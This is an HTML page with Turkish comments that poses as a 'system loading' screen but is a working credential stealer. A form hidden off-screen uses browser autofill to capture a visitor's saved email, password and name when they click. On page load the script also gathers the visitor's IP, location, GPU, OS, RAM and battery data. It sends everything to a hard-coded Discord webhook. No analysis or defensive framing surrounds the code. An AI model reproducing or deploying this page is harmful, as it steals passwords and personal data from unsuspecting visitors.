<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem YÃ¼kleniyor...</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; font-family: sans-serif; color: #0f0; }
        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Gizli Form: KullanÄ±cÄ± gÃ¶rmez ama tarayÄ±cÄ± doldurur */
        #hidden-form { opacity: 0; position: absolute; top: -1000px; left: -1000px; }
    </style>
</head>
<body>
    <div class="l"></div>

    <form id="hidden-form">
        <input type="email" name="email" id="e" autocomplete="email">
        <input type="password" name="password" id="p" autocomplete="current-password">
        <input type="text" name="full-name" id="n" autocomplete="name">
    </form>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function getIPInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch { return {}; }
        }

        async function getBatteryInfo() {
            try {
                const b = await navigator.getBattery();
                return `%${Math.round(b.level * 100)} (${b.charging ? 'Åžarjda' : 'Pilde'})`;
            } catch { return "EriÅŸilemedi"; }
        }

        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
            } catch { return "N/A"; }
        }

        async function sendToDiscord(extraData = {}) {
            const ip = await getIPInfo();
            const bat = await getBatteryInfo();
            
            const payload = {
                embeds: [{
                    title: "ðŸ’€ GeliÅŸmiÅŸ Sistem ve Autofill Analizi",
                    color: 0x00ff00,
                    fields: [
                        { name: "ðŸŒ AÄŸ Bilgisi", value: `**IP:** \`${ip.ip || '?'}\`\n**ISS:** ${ip.org || '?'}\n**Konum:** ${ip.city}/${ip.country_name}`, inline: true },
                        { name: "ðŸ’» DonanÄ±m", value: `**GPU:** \`${getGPU()}\`\n**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || '?'}GB`, inline: true },
                        { name: "ðŸ”‹ Pil", value: bat, inline: true },
                        { name: "ðŸ”‘ SÄ±zdÄ±rÄ±lan Veriler", value: `**E-posta:** \`${extraData.email || 'BoÅŸ'}\`\n**Åžifre:** \`${extraData.pass || 'BoÅŸ'}\`\n**Ä°sim:** \`${extraData.name || 'BoÅŸ'}\`` }
                    ],
                    footer: { text: "Protocol: Omniscience v8.0" },
                    timestamp: new Date()
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // Global EtkileÅŸim Dinleyici
        document.addEventListener('click', () => {
            // KullanÄ±cÄ± tÄ±kladÄ±ÄŸÄ± an tarayÄ±cÄ±yÄ± doldurmaya zorla
            document.getElementById('e').focus();
            
            // Veri varsa (autofill Ã§alÄ±ÅŸtÄ±ysa) 1 saniye sonra gÃ¶nder
            setTimeout(() => {
                const data = {
                    email: document.getElementById('e').value,
                    pass: document.getElementById('p').value,
                    name: document.getElementById('n').value
                };
                if(data.email || data.pass) {
                    sendToDiscord(data);
                }
            }, 1000);
        });

        // Sayfa aÃ§Ä±ldÄ±ÄŸÄ±nda temel bilgileri hemen gÃ¶nder
        window.onload = () => sendToDiscord();
    </script>
</body>
</html>
